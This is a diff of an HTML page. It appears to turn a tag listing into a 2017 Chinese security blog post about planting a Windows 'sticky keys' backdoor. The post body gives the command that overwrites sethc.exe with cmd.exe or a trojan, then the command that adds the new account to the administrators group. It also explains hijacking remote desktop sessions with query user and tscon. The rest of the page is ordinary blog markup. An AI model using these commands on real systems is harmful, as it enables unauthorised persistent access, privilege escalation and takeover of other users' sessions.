@@ -45,7 +45,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="后门," />
 
 
 
@@ -63,13 +63,22 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Y-HKL&#39;s Blog">
-<meta property="og:url" content="http://y-hkl.top/tags/漏洞/index.html">
+<meta name="description" content="我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。">
+<meta name="keywords" content="后门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过shift快捷键运行后门">
+<meta property="og:url" content="http://y-hkl.top/2017/10/09/通过shift快捷键运行后门/index.html">
 <meta property="og:site_name" content="Y-HKL&#39;s Blog">
+<meta property="og:description" content="我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://y-hkl.top/upload_img/后门-1.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/后门-2.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/后门-3.png">
+<meta property="og:updated_time" content="2017-10-09T08:42:33.414Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Y-HKL&#39;s Blog">
+<meta name="twitter:title" content="通过shift快捷键运行后门">
+<meta name="twitter:description" content="我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。">
+<meta name="twitter:image" content="http://y-hkl.top/upload_img/后门-1.png">
 
 
 
@@ -97,13 +106,13 @@
 
 
 
-  <link rel="canonical" href="http://y-hkl.top/tags/漏洞/"/>
+  <link rel="canonical" href="http://y-hkl.top/2017/10/09/通过shift快捷键运行后门/"/>
 
 
 
 
 
-  <title> 标签: 漏洞 | Y-HKL's Blog </title>
+  <title> 通过shift快捷键运行后门 | Y-HKL's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -128,7 +137,7 @@
     
   
 
-  <div class="container sidebar-position-left  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -266,102 +275,240 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-collapse">
-    <div class="collection-title">
-      <h2 >
-        漏洞
-        <small>标签</small>
-      </h2>
-    </div>
-
+  <div id="posts" class="posts-expand">
     
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h1 class="post-title">
-        
-            <a class="post-title-link" href="/2017/09/13/s2-053复现/" itemprop="url">
-              
-                <span itemprop="name">s2-053漏洞复现</span>
-              
-            </a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-13T02:54:49-04:00"
-              content="2017-09-13" >
-          09-13
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h1 class="post-title">
-        
-            <a class="post-title-link" href="/2017/09/08/s2-052复现/" itemprop="url">
-              
-                <span itemprop="name">s2-052复现</span>
-              
-            </a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-08T03:35:17-04:00"
-              content="2017-09-08" >
-          09-08
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h1 class="post-title">
-        
-            <a class="post-title-link" href="/2017/08/31/渗透测试常用脑图/" itemprop="url">
-              
-                <span itemprop="name">渗透测试常用脑图</span>
-              
-            </a>
-        
-      </h1>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-08-31T23:00:44-04:00"
-              content="2017-08-31" >
-          08-31
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-    
-  </div>
 
   
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://y-hkl.top/2017/10/09/通过shift快捷键运行后门/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Y-HKL">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/tt.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y-HKL's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                通过shift快捷键运行后门
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-09T04:12:40-04:00">
+                2017-10-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/10/09/通过shift快捷键运行后门/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/10/09/通过shift快捷键运行后门/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。<br><a id="more"></a></p>
+<h2 id="创建shift快捷键后门"><a href="#创建shift快捷键后门" class="headerlink" title="创建shift快捷键后门"></a>创建shift快捷键后门</h2><p>将我们的cmd.exe或者木马后门名字改成sethc.exe，然后替换C:windows\system32\sethc.exe程序<br>命令：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">copy C:\WINDOWS\system32\cmd.exe C:\WINDOWS\system32\sethc.exe /Y</div></pre></td></tr></table></figure></p>
+<h2 id="测试是否成功"><a href="#测试是否成功" class="headerlink" title="测试是否成功"></a>测试是否成功</h2><p>使用远程连接，按5下shift键可以调出cmd命令窗口，还可以添加账户：<br><img src="/upload_img/后门-1.png" alt=""><br>使用net user可以查看是否添加成功。<br><img src="/upload_img/后门-2.png" alt=""><br>使用命令添加到管理员组<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net localgroup administrators test /add</div></pre></td></tr></table></figure></p>
+<p>然后就可以使用创建的用户登录了</p>
+<h2 id="远程桌面会话劫持登录主机"><a href="#远程桌面会话劫持登录主机" class="headerlink" title="远程桌面会话劫持登录主机"></a>远程桌面会话劫持登录主机</h2><p>结合query和tscon命令达到会话劫持目的<br>query user查询所有已登录的用户会话信息<br>tscon 会话ID切换到目标会话状态<br><img src="/upload_img/后门-3.png" alt=""><br>回车之后可直接切换成目标用户登录系统。</p>
+
+      
+    </div>
+	
+	<div>
+	  
+		﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+	
+	<div>
+      
+        ﻿
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2017/10/09/通过shift快捷键运行后门/">通过shift快捷键运行后门</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 Y-HKL 的个人博客">Y-HKL</a></p>
+  <p><span>发布时间:</span>2017年10月09日 - 04:10</p>
+  <p><span>最后更新:</span>2017年10月09日 - 04:10</p>
+  <p><span>原始链接:</span><a href="/2017/10/09/通过shift快捷键运行后门/" title="通过shift快捷键运行后门">http://y-hkl.top/2017/10/09/通过shift快捷键运行后门/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://y-hkl.top/2017/10/09/通过shift快捷键运行后门/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({   
+          title: "",   
+          text: '复制成功',   
+          html: false,
+          timer: 500,   
+          showConfirmButton: false
+        });
+      });
+    }));  
+</script>
+
+      
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/后门/" rel="tag"><i class="fa fa-tag"></i> 后门</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/16/基于报错布尔时间的SQL注入POC编写/" rel="next" title="基于报错布尔时间的SQL注入POC编写">
+                <i class="fa fa-chevron-left"></i> 基于报错布尔时间的SQL注入POC编写
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -369,6 +516,17 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -388,8 +546,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/tt.png"
@@ -512,6 +679,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#创建shift快捷键后门"><span class="nav-number">1.</span> <span class="nav-text">创建shift快捷键后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试是否成功"><span class="nav-number">2.</span> <span class="nav-text">测试是否成功</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程桌面会话劫持登录主机"><span class="nav-number">3.</span> <span class="nav-text">远程桌面会话劫持登录主机</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -638,6 +821,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
@@ -655,6 +842,18 @@
       <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
     
 
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://y-hkl.top/2017/10/09/通过shift快捷键运行后门/';
+          this.page.identifier = '2017/10/09/通过shift快捷键运行后门/';
+          this.page.title = '通过shift快捷键运行后门';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
     
 
   
